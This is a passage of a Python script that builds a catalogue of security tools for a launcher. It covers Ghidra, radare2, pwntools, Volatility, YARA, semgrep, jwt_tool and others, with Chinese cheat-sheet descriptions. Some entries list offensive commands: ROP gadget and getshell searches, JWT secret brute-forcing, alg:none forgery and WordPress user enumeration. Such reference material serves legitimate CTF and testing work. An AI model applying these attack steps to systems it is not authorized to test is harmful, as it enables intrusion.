    {"name": "Ghidra",        "type": "gui",   "path": "/Applications/Ghidra.app",
     "category": "reverse",   "args": "",
     "tags": ["逆向","反汇编","NSA"],
     "description": "NSA开源逆向工程平台\n功能: 多架构反汇编、反编译、脚本自动化\n常用: 导入二进制→分析→CodeBrowser→Decompiler"},
    {"name": "radare2",       "type": "shell", "path": "/opt/homebrew/bin/radare2",
     "category": "reverse",   "args": "",
     "tags": ["逆向","反汇编","调试"],
     "description": "命令行逆向框架\n常用命令:\n  r2 -d ./binary                 调试模式\n  r2 binary                      静态分析\n  # r2 内部:\n  aaa                            自动分析\n  afl                            列出函数\n  pdf @ main                     反汇编main\n  VV                             视觉模式"},
    {"name": "JD-GUI",        "type": "gui",   "path": "/Applications/JD-GUI.app",
     "category": "reverse",   "args": "",
     "tags": ["Java反编译","JAR","CLASS"],
     "description": "Java反编译GUI工具\n功能: 可视化反编译JAR/CLASS文件\n使用: 拖入JAR文件查看源码"},
    {"name": "binwalk",       "type": "shell", "path": "/opt/homebrew/bin/binwalk",
     "category": "reverse",   "args": "-e firmware.bin",
     "tags": ["固件分析","提取","CTF"],
     "description": "固件分析与提取\n常用命令:\n  binwalk firmware.bin           文件类型分析\n  binwalk -e firmware.bin        提取文件系统\n  binwalk -Me firmware.bin       递归提取\n  binwalk -A binary              扫描CPU架构指令"},
    {"name": "exiftool",      "type": "shell", "path": "/opt/homebrew/bin/exiftool",
     "category": "reverse",   "args": "",
     "tags": ["元数据","EXIF","隐写"],
     "description": "文件元数据分析\n常用命令:\n  exiftool file.jpg               查看所有元数据\n  exiftool -gps:all photo.jpg     查看GPS信息\n  exiftool -all= file.jpg         清除所有元数据\n  exiftool -comment='text' file   写入注释"},
    # PWN/CTF
    {"name": "ROPgadget",     "type": "shell", "path": "/opt/homebrew/bin/ROPgadget",
     "category": "pwn",       "args": "--binary ./target",
     "tags": ["ROP","PWN","gadget"],
     "description": "ROP gadget搜索\n常用命令:\n  ROPgadget --binary ./target --rop\n  ROPgadget --binary ./target --string '/bin/sh'\n  ROPgadget --binary ./target --rop | grep 'pop rdi'\n  ROPgadget --binary libc.so.6 --rop > gadgets.txt"},
    {"name": "one_gadget",    "type": "shell", "path": "/Users/admin/.local/bin/one_gadget",
     "category": "pwn",       "args": "/lib/x86_64-linux-gnu/libc.so.6",
     "tags": ["one_gadget","libc","shellcode"],
     "description": "libc一键getshell gadget\n常用命令:\n  one_gadget /lib/x86_64-linux-gnu/libc.so.6\n  one_gadget libc.so.6 -l 2       更多备选gadget\n  one_gadget libc.so.6 -b 0x1234  指定基址"},
    {"name": "seccomp-tools", "type": "shell", "path": "/Users/admin/.local/bin/seccomp-tools",
     "category": "pwn",       "args": "dump ./target",
     "tags": ["seccomp","沙箱","syscall"],
     "description": "seccomp沙箱分析\n常用命令:\n  seccomp-tools dump ./target     运行并提取seccomp规则\n  seccomp-tools disasm dump.bin   反汇编规则\n  seccomp-tools asm rules.s       汇编规则"},
    {"name": "pwntools",      "type": "shell", "path": "/Users/admin/.local/bin/pwn",
     "category": "pwn",       "args": "",
     "tags": ["PWN框架","CTF","exploit"],
     "description": "PWN利用开发框架\n常用命令:\n  pwn checksec ./binary          检查保护\n  pwn cyclic 200                 生成cyclic模式串\n  pwn cyclic -l 0x6161616c       找offset\n  python3 -c 'from pwn import *; p=process(\"./bin\"); p.interactive()'"},
    {"name": "checksec",      "type": "shell", "path": "/opt/homebrew/bin/checksec",
     "category": "pwn",       "args": "--file=./binary",
     "tags": ["保护检测","ELF","NX/PIE/CANARY"],
     "description": "ELF安全保护检测\n常用命令:\n  checksec --file=./binary\n  checksec --proc-all            检查所有运行进程\n  # 输出包括: RELRO, Stack Canary, NX, PIE, ASLR"},
    # 应急响应
    {"name": "Volatility 3",  "type": "shell", "path": "/Users/admin/.local/bin/vol",
     "category": "forensics", "args": "-f memory.dmp windows.info",
     "tags": ["内存取证","Volatility","应急响应"],
     "description": "内存取证分析框架\n常用命令:\n  vol -f mem.dmp windows.info              基本信息\n  vol -f mem.dmp windows.pslist            进程列表\n  vol -f mem.dmp windows.cmdline           命令行\n  vol -f mem.dmp windows.netscan           网络连接\n  vol -f mem.dmp windows.malfind          可疑代码\n  vol -f mem.dmp windows.dumpfiles --pid 1234"},
    {"name": "YARA",          "type": "shell", "path": "/opt/homebrew/bin/yara",
     "category": "forensics", "args": "rule.yar target_file",
     "tags": ["恶意软件","特征匹配","YARA"],
     "description": "恶意软件特征匹配\n常用命令:\n  yara rules.yar suspicious_file\n  yara -r rules.yar /path/to/dir    递归扫描目录\n  yara -s rules.yar file            显示匹配字符串\n  yara malware_rules/ /mnt/sample/"},
    {"name": "capa",          "type": "shell", "path": "/Users/admin/.local/bin/capa",
     "category": "forensics", "args": "malware.exe",
     "tags": ["能力分析","恶意软件","行为分析"],
     "description": "二进制能力分析\n常用命令:\n  capa malware.exe                   分析恶意软件能力\n  capa -j output.json malware.exe    JSON输出\n  capa -v malware.exe                详细模式\n  capa --signatures /path/ sample"},
    # 代码审计
    {"name": "semgrep",       "type": "shell", "path": "/opt/homebrew/bin/semgrep",
     "category": "code-audit","args": "--config=auto .",
     "tags": ["SAST","代码审计","静态分析"],
     "description": "静态应用安全测试(SAST)\n常用命令:\n  semgrep --config=auto .                     自动规则扫描当前目录\n  semgrep --config=p/java-security .          Java安全规则\n  semgrep --config=p/php-security .           PHP安全规则\n  semgrep --config=p/owasp-top-ten .          OWASP Top 10"},
    # 密码学/CTF
    {"name": "CyberChef (本地)", "type": "gui", "path": str(TH_BASE / "tools/web/CyberChef/CyberChef.html"),
     "category": "crypto",    "args": "",
     "tags": ["编解码","加解密","CTF","本地"],
     "description": "全能编解码工具(本地离线版)\n功能: Base64/Hex/URL/JWT/AES/RSA解密、格式转换\n使用: 浏览器内交互式操作，无需网络"},
    {"name": "hashid",        "type": "shell", "path": "/opt/homebrew/bin/hashid",
     "category": "crypto",    "args": "",
     "tags": ["哈希识别","CTF"],
     "description": "哈希类型识别\n常用命令:\n  hashid '<hash_value>'\n  hashid -m '<hash>' (返回hashcat模式编号)\n  hashid -j '<hash>' (返回john格式)"},
    # AI安全工具
    {"name": "LM Studio",     "type": "gui",   "path": "/Applications/LM Studio.app",
     "category": "other",     "args": "",
     "tags": ["本地大模型","AI","LLM"],
     "description": "本地大模型运行平台\n功能: 下载运行llama/mistral等模型，OpenAI兼容API"},
    {"name": "VMware Fusion", "type": "gui",   "path": "/Applications/VMware Fusion.app",
     "category": "other",     "args": "",
     "tags": ["虚拟机","靶机","环境隔离"],
     "description": "macOS虚拟机平台\n用于运行靶机(Kali/Windows/Ubuntu)"},
    {"name": "jwt_tool",      "type": "shell", "path": "/Users/admin/.local/bin/jwt_tool",
     "category": "crypto",    "args": "<JWT>",
     "tags": ["JWT","Web安全","Auth"],
     "description": "JWT安全测试工具\n常用命令:\n  jwt_tool <token>               解码分析\n  jwt_tool <token> -T            篡改测试\n  jwt_tool <token> -C -d wordlist.txt  爆破secret\n  jwt_tool <token> -X a          alg:none攻击"},
    {"name": "wpprobe",       "type": "shell", "path": "/Users/admin/.local/bin/wpprobe",
     "category": "recon",     "args": "-u https://example.com",
     "tags": ["WordPress","指纹","CMS"],
     "description": "WordPress指纹识别\n常用命令:\n  wpprobe -u https://target.com\n  wpprobe -u https://target.com -a   枚举用户"},
]

# 去重（同名工具保留一个）
existing_names = {t["name"] for t in tools_out}
for et in EXTRA_TOOLS:
    if et["name"] not in existing_names:
        entry = {
            "id":          slug(et["name"]),
            "name":        et["name"],
            "type":        et.get("type", "shell"),
            "path":        et.get("path", ""),
            "category":    et.get("category", "other"),
            "env_id":      None,
            "args":        et.get("args", ""),
            "tags":        et.get("tags", []),
            "description": et.get("description", ""),
            "available":   Path(et.get("path", "")).exists() if et.get("path", "") else False,
        }
        tools_out.append(entry)
        existing_names.add(et["name"])

# ── 环境配置 ─────────────────────────────────────────────────────────────────
ENVIRONMENTS = {
    "environments": [
        {
            "id": "java-java-8-mac-1-8-0-421",
            "name": "Java 8 (TH_Tools bundled)",
            "type": "java",
            "path": JAVA8_HOME,
            "version": "1.8.0_421",
            "source": "auto",
            "tags": ["bundled", "javafx"],
            "javafx": True,
        },
        {
            "id": "java-java-11-mac-11-0-24",
            "name": "Java 11 (TH_Tools bundled)",
            "type": "java",
            "path": JAVA11_HOME,
            "version": "11.0.24",
            "source": "auto",
            "tags": ["bundled"],
            "javafx": False,
        },
        {
            "id": "py-brew-3-12",
            "name": "Python 3.12 (brew)",
            "type": "python",
            "path": "/opt/homebrew/bin/python3.12",
            "version": "3.12",
            "source": "auto",
            "tags": ["brew"],
        },
    ],
    "defaults": {
        "java": "java-java-8-mac-1-8-0-421",
        "python": "py-brew-3-12",
    },
}

# ── 输出文件 ─────────────────────────────────────────────────────────────────
(DATA_DIR / "tools.json").write_text(
    json.dumps(tools_out, indent=2, ensure_ascii=False), encoding="utf-8"
)
(DATA_DIR / "categories.json").write_text(
    json.dumps(CATEGORIES, indent=2, ensure_ascii=False), encoding="utf-8"
)
(DATA_DIR / "environments.json").write_text(
    json.dumps(ENVIRONMENTS, indent=2, ensure_ascii=False), encoding="utf-8"
)
(DATA_DIR / "settings.json").write_text(
    json.dumps({"theme": "dark"}, indent=2, ensure_ascii=False), encoding="utf-8"
)

avail = sum(1 for t in tools_out if t.get("available", False))
print(f"✓ 写出 {len(tools_out)} 个工具 ({avail} 可用) 到 {DATA_DIR}")
print(f"✓ {len(CATEGORIES)} 个分类")
print(f"  缺失路径工具 (已过滤/保留): {len(missing)}")

# 按分类统计
cat_count = {}
for t in tools_out:
    c = t["category"]
    cat_count[c] = cat_count.get(c, 0) + 1
cat_name = {c["id"]: c["name"] for c in CATEGORIES}
print("\n分类分布:")
for cid, cnt in sorted(cat_count.items(), key=lambda x: -x[1]):
    print(f"  {cat_name.get(cid, cid)}: {cnt}")
